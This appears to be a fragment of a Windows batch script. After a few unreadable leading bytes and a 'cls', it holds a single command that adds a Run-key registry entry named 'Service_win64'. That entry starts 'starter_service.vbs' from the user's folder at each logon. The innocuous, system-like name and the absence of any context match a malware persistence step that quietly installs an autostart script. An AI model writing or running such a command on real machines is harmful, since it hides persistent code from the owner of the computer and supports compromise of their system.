��&cls
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Service_win64 /t REG_EXPAND_SZ /d "C:\Users\%username%\starter_service.vbs" /f